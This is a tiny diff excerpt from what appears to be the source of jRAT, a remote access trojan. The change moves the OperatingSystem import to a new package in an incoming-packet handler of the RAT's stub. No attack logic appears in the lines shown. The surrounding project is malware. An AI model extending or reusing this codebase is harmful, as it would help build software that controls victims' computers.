@@ -3,9 +3,9 @@ package pro.jrat.stub.packets.incoming;
 import java.io.File;
 import java.io.FileWriter;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 
-import com.redpois0n.common.OperatingSystem;
 
 
 
